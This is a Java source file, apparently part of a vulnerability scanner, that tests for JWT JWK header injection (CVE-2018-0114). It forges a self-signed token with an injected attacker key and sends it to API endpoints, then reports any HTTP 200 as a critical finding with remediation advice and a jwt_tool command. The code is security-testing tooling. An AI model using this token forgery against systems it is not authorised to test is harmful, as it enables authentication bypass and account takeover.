package gg.effront.anarcry.scanner.crypto.jwt;

import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.util.Http;

import java.math.BigInteger;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.interfaces.RSAPublicKey;
import java.time.Duration;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Optional;
import java.util.function.Consumer;
import gg.effront.anarcry.model.CweRegistry;
import gg.effront.anarcry.model.CvssCalculator;

public class JwkInjectionProbe {

    private static final List<String> AUTH_PATHS = List.of("/api/me", "/api/user", "/api/profile");

    public Optional<Finding> probe(String[] parts, ScanContext ctx, String base, HttpClient hc, Consumer<String> log) {
        log.accept("[~] JWT: probe JWK header injection (CVE-2018-0114)");
        try {
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
            kpg.initialize(2048);
            KeyPair kp = kpg.generateKeyPair();
            RSAPublicKey pub = (RSAPublicKey) kp.getPublic();

            String n = b64urlUnsigned(pub.getModulus());
            String e = b64urlUnsigned(pub.getPublicExponent());

            String jwk = "{\"kty\":\"RSA\",\"kid\":\"anarcry-probe\",\"use\":\"sig\"," +
                         "\"e\":\"" + e + "\",\"n\":\"" + n + "\"}";
            String headerJson = "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jwk\":" + jwk + "}";
            String forgedHeader = Base64.getUrlEncoder().withoutPadding()
                    .encodeToString(headerJson.getBytes(StandardCharsets.UTF_8));

            String sigInput = forgedHeader + "." + parts[1];
            Signature rsa = Signature.getInstance("SHA256withRSA");
            rsa.initSign(kp.getPrivate());
            rsa.update(sigInput.getBytes(StandardCharsets.UTF_8));
            String sig = Base64.getUrlEncoder().withoutPadding().encodeToString(rsa.sign());
            String forgedToken = sigInput + "." + sig;

            log.accept("[~] JWT: JWK injection token forjado, enviando probes");
            for (String path : AUTH_PATHS) {
                try {
                    HttpRequest req = HttpRequest.newBuilder()
                            .uri(URI.create(base + path))
                            .header("Authorization", "Bearer " + forgedToken)
                            .timeout(Duration.ofSeconds(5))
                            .GET().build();
                    HttpResponse<Void> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.discarding(), "JWT");
                    log.accept("[~] JWT: JWK injection " + path + " → HTTP " + resp.statusCode());
                    if (resp.statusCode() == 200) {
                        String _cweId = CweRegistry.cweId("JWT");
                        String _cweTitle = CweRegistry.cweTitle("JWT");
                        String _cvssVector = CweRegistry.cvssVector("JWT");
                        double _score = CvssCalculator.calculate(_cvssVector);
                        return Optional.of(Finding.of("JWT", base + path,
                                "JWK header injection aceita ativamente (CVE-2018-0114)", Severity.CRITICAL,
                                "Probe em " + base + path + " → HTTP 200 com chave JWK attacker-controlled injetada no header",
                                "Servidor confia na chave pública embutida no próprio token — atacante pode self-sign qualquer payload",
                                "python3 jwt_tool.py <token> -X i",
                                "Ignorar o campo jwk no header do token; usar apenas chaves pré-configuradas no servidor",
                                _cweId, _cweTitle, _cvssVector, _score));
                    }
                } catch (Exception ex) {
                    log.accept("[~] JWT: JWK injection " + path + " — " + ex.getMessage());
                }
            }
        } catch (Exception e) {
            log.accept("[~] JWT: JWK injection — " + e.getMessage());
        }
        return Optional.empty();
    }

    private static String b64urlUnsigned(BigInteger val) {
        byte[] b = val.toByteArray();
        // BigInteger.toByteArray() can prefix a 0x00 sign byte — strip it for JWK
        if (b.length > 1 && b[0] == 0) {
            b = Arrays.copyOfRange(b, 1, b.length);
        }
        return Base64.getUrlEncoder().withoutPadding().encodeToString(b);
    }
}
